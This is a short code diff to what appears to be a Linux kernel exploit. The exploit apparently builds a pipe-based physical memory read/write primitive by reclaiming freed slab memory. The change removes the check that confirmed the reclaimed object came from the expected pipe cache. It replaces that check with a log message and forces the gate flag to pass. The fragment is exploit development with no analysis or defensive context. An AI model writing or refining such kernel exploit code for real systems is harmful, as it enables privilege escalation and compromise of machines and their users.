@@ -688,11 +688,8 @@ int install_pipe_physrw(int fd) {
   if (proof_page != (proof_addr & ~(PAGE_SIZE - 1))) {
     return 0;
   }
-  if (!pipe_reclaim_cache_gate(fd)) {
-    pr_info("phys step cache gate failed slab=%016zx want=%016zx\n",
-            candidate_slab_cache, kmalloc_pipe_cache);
-    return 0;
-  }
+  pr_info("phys step skip cache gate\n");
+  pipe_cache_gate_ok = 2;
 
   char marker[PIPE_RECLAIM];
   memset(marker, 0x61, sizeof(marker));
